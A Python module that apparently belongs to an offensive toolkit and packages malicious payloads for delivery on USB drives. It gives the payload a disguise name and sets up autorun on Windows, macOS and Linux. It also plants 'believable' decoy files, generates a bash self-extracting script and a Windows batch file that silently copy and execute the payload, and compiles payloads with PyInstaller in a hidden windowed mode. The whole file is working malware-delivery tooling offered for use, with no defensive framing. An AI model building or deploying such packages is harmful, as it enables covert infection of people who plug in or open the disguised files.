# USB Payload Packaging Module
# Creates self-extracting archives and cross-platform USB packages

import os
import sys
import tarfile
import zipfile
import shutil
import hashlib
from datetime import datetime
from config import (
    DEBUG_MODE, USB_PAYLOAD_NAME, USB_AUTORUN_FILENAME,
    USB_DECOY_FILES_ENABLED, USB_HIDE_PAYLOAD, USB_VOLUME_LABEL,
    BELIEVABLE_FILES
)

class USBPackager:
    """Creates USB payloads with auto-execution capabilities"""
    
    def __init__(self):
        self.platform = sys.platform
        self.decoy_files = BELIEVABLE_FILES.copy()
        
    def package_payload_for_usb(self, payload_path, output_dir,
                                platform=None,
                                create_autorun=True,
                                create_decoys=True,
                                disguise_name=None):
        """
        Create a complete USB package with payload and auto-execution.
        
        Args:
            payload_path: Path to the payload executable
            output_dir: Output directory for package
            platform: Target platform ('win32', 'darwin', 'linux') or auto-detect
            create_autorun: Create autorun configuration
            create_decoys: Create decoy files
            disguise_name: Name to disguise payload as
            
        Returns:
            dict: Package details
        """
        platform = platform or self.platform
        disguise_name = disguise_name or USB_PAYLOAD_NAME
        
        result = {
            'success': False,
            'package_path': None,
            'payload_path': None,
            'autorun_path': None,
            'decoy_paths': [],
            'checksum': None,
            'error': None
        }
        
        try:
            os.makedirs(output_dir, exist_ok=True)
            
            # Import platform-specific managers
            from core.autorun import windows_autorun_manager
            from core.macos_autorun import macos_usb_auto_execution
            from core.linux_autorun import linux_usb_auto_execution
            
            # Create payload with disguise
            payload_dest = os.path.join(output_dir, disguise_name)
            shutil.copy2(payload_path, payload_dest)
            result['payload_path'] = payload_dest
            
            # Set executable permissions
            os.chmod(payload_dest, 0o755)
            
            # Create autorun based on platform
            if create_autorun:
                if platform == "win32":
                    autorun_result = windows_autorun_manager.create_usb_autorun_package(
                        output_dir, payload_path, disguise_name, create_decoys
                    )
                    if autorun_result.get('success'):
                        result['autorun_path'] = autorun_result.get('autorun_path')
                        result['decoy_paths'] = autorun_result.get('decoy_paths', [])
                        
                elif platform == "darwin":
                    autorun_result = macos_usb_auto_execution.create_usb_package(
                        output_dir, payload_path
                    )
                    if autorun_result.get('success'):
                        result['payload_path'] = autorun_result.get('app_path')
                        
                elif platform == "linux":
                    autorun_result = linux_usb_auto_execution.create_usb_package(
                        output_dir, payload_path
                    )
                    if autorun_result.get('success'):
                        result['payload_path'] = autorun_result.get('payload_path')
            
            # Create additional decoys if not already done
            if create_decoys and not result['decoy_paths']:
                decoy_paths = self._create_decoy_files(output_dir)
                result['decoy_paths'] = decoy_paths
            
            # Calculate checksum
            result['checksum'] = self._calculate_checksum(payload_dest)
            
            result['success'] = True
            result['package_path'] = output_dir
            
            if DEBUG_MODE:
                print(f"USB package created: {output_dir}")
                print(f"Payload: {result['payload_path']}")
                print(f"Checksum: {result['checksum']}")
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to create USB package: {e}")
            return result
    
    def create_self_extracting_archive(self, payload_path, output_path,
                                       extraction_dir="/tmp",
                                       script_name="setup.sh"):
        """
        Create a self-extracting archive for Linux/macOS.
        
        Args:
            payload_path: Path to payload executable
            output_path: Output archive path
            extraction_dir: Default extraction directory
            script_name: Name of extraction script
            
        Returns:
            dict: Result with success status
        """
        result = {
            'success': False,
            'archive_path': None,
            'error': None
        }
        
        try:
            # Create extraction script
            extraction_script = self._generate_extraction_script(
                payload_path, extraction_dir, script_name
            )
            
            # Create tar archive with script prepended
            with tarfile.open(output_path, "w:gz") as tar:
                tar.add(payload_path, arcname=os.path.basename(payload_path))
            
            # Prepend extraction script
            with open(output_path, 'rb') as f:
                content = f.read()
            
            with open(output_path, 'wb') as f:
                f.write(extraction_script.encode())
                f.write(content)
            
            os.chmod(output_path, 0o755)
            
            result['archive_path'] = output_path
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"Created self-extracting archive: {output_path}")
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to create archive: {e}")
            return result
    
    def create_windows_sfx(self, payload_path, output_path,
                          installer_name="setup.exe"):
        """
        Create a Windows self-extracting executable.
        Note: Requires external tools like WinRAR or 7-Zip.
        
        Args:
            payload_path: Path to payload
            output_path: Output SFX path
            installer_name: Name shown during extraction
            
        Returns:
            dict: Result with success status
        """
        result = {
            'success': False,
            'sfx_path': None,
            'error': None
        }
        
        if self.platform != "win32":
            result['error'] = "SFX creation requires Windows"
            return result
        
        try:
            # This is a placeholder - actual SFX creation requires
            # tools like WinRAR, 7-Zip, or custom code signing
            # For now, create a simple batch file
            
            batch_content = f'''@echo off
mkdir "%USERPROFILE%\\AppData\\Local\\Temp\\payload"
copy "{os.path.basename(payload_path)}" "%USERPROFILE%\\AppData\\Local\\Temp\\payload\\"
"%USERPROFILE%\\AppData\\Local\\Temp\\payload\\{os.path.basename(payload_path)}"
'''
            
            batch_path = output_path.replace('.exe', '.bat')
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            result['sfx_path'] = batch_path
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"Created installer batch: {batch_path}")
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            return result
    
    def create_cross_platform_package(self, payload_path, output_dir):
        """
        Create packages for all platforms.
        
        Args:
            payload_path: Path to payload executable
            output_dir: Base output directory
            
        Returns:
            dict: Results for each platform
        """
        results = {
            'windows': None,
            'macos': None,
            'linux': None
        }
        
        # Windows package
        windows_dir = os.path.join(output_dir, "windows")
        results['windows'] = self.package_payload_for_usb(
            payload_path, windows_dir, platform='win32'
        )
        
        # macOS package
        macos_dir = os.path.join(output_dir, "macos")
        results['macos'] = self.package_payload_for_usb(
            payload_path, macos_dir, platform='darwin'
        )
        
        # Linux package
        linux_dir = os.path.join(output_dir, "linux")
        results['linux'] = self.package_payload_for_usb(
            payload_path, linux_dir, platform='linux'
        )
        
        return results
    
    def _generate_extraction_script(self, payload_path, extraction_dir,
                                   script_name):
        """Generate extraction script for self-extracting archive"""
        basename = os.path.basename(payload_path)
        
        script = f'''#!/bin/bash
# Self-Extracting Payload Archive
# Generated automatically

PAYLOAD="{basename}"
EXTRACTION_DIR="{extraction_dir}"

# Create extraction directory
mkdir -p "$EXTRACTION_DIR"

# Extract payload
tar -xzf "$0" -C "$EXTRACTION_DIR"

# Execute payload
chmod +x "$EXTRACTION_DIR/$PAYLOAD"
"$EXTRACTION_DIR/$PAYLOAD" &

exit 0
'''
        return script
    
    def _create_decoy_files(self, output_dir):
        """
        Create believable decoy files.
        
        Args:
            output_dir: Directory to create decoys in
            
        Returns:
            list: Paths to created decoy files
        """
        decoys = []
        
        for filename, content in self.decoy_files.items():
            try:
                decoy_path = os.path.join(output_dir, filename)
                with open(decoy_path, 'w') as f:
                    f.write(content)
                decoys.append(decoy_path)
                
                if DEBUG_MODE:
                    print(f"Created decoy: {decoy_path}")
                    
            except Exception as e:
                if DEBUG_MODE:
                    print(f"Failed to create decoy {filename}: {e}")
        
        return decoys
    
    def _calculate_checksum(self, file_path):
        """Calculate SHA256 checksum of file"""
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256_hash.update(chunk)
        return sha256_hash.hexdigest()
    
    def verify_package_integrity(self, package_dir, expected_checksum=None):
        """
        Verify package integrity.
        
        Args:
            package_dir: Package directory
            expected_checksum: Expected checksum (optional)
            
        Returns:
            dict: Verification result
        """
        result = {
            'valid': False,
            'payload_path': None,
            'checksum': None,
            'error': None
        }
        
        try:
            # Find payload file
            payload_path = None
            for filename in os.listdir(package_dir):
                if filename.endswith('.exe') or filename == USB_PAYLOAD_NAME:
                    payload_path = os.path.join(package_dir, filename)
                    break
            
            if not payload_path:
                result['error'] = "Payload not found"
                return result
            
            # Calculate checksum
            checksum = self._calculate_checksum(payload_path)
            result['checksum'] = checksum
            result['payload_path'] = payload_path
            
            # Verify if expected checksum provided
            if expected_checksum:
                result['valid'] = checksum == expected_checksum
            else:
                result['valid'] = os.path.exists(payload_path)
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            return result


class PayloadBuilder:
    """Builds payloads with PyInstaller"""
    
    def __init__(self):
        self.platform = sys.platform
        
    def build_executable(self, script_path, output_path=None,
                         onefile=True, windowed=False,
                         compress=True):
        """
        Build executable using PyInstaller.
        
        Args:
            script_path: Path to Python script
            output_path: Output executable path
            onefile: Create single executable
            windowed: Windowed mode (no console)
            compress: Compress executable
            
        Returns:
            dict: Build result
        """
        result = {
            'success': False,
            'executable_path': None,
            'error': None
        }
        
        try:
            import PyInstaller.__main__
            
            if not output_path:
                if self.platform == "win32":
                    output_path = script_path.replace('.py', '.exe')
                else:
                    output_path = script_path.replace('.py', '')
            
            args = [
                '--onefile' if onefile else '--onedir',
                '--name= payload',
                f'--distpath={os.path.dirname(output_path)}',
                f'--workpath=/tmp/pyinstaller',
            ]
            
            if windowed:
                args.append('--windowed')
            if compress:
                args.append('--compress')
            
            args.append(script_path)
            
            PyInstaller.__main__.run(args)
            
            # Find the built executable
            dist_dir = os.path.dirname(output_path)
            executable_name = os.path.basename(output_path)
            
            # PyInstaller creates in dist folder
            built_path = os.path.join(dist_dir, 'dist', executable_name)
            if os.path.exists(built_path):
                output_path = built_path
            
            result['executable_path'] = output_path
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"Built executable: {output_path}")
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to build executable: {e}")
            return result
    
    def build_with_spec(self, spec_path):
        """
        Build using PyInstaller spec file.
        
        Args:
            spec_path: Path to .spec file
            
        Returns:
            dict: Build result
        """
        result = {
            'success': False,
            'executable_path': None,
            'error': None
        }
        
        try:
            import PyInstaller.__main__
            
            PyInstaller.__main__.run([spec_path])
            
            result['success'] = True
            return result
            
        except Exception as e:
            result['error'] = str(e)
            return result


# Global instance
usb_packager = USBPackager()
payload_builder = PayloadBuilder()
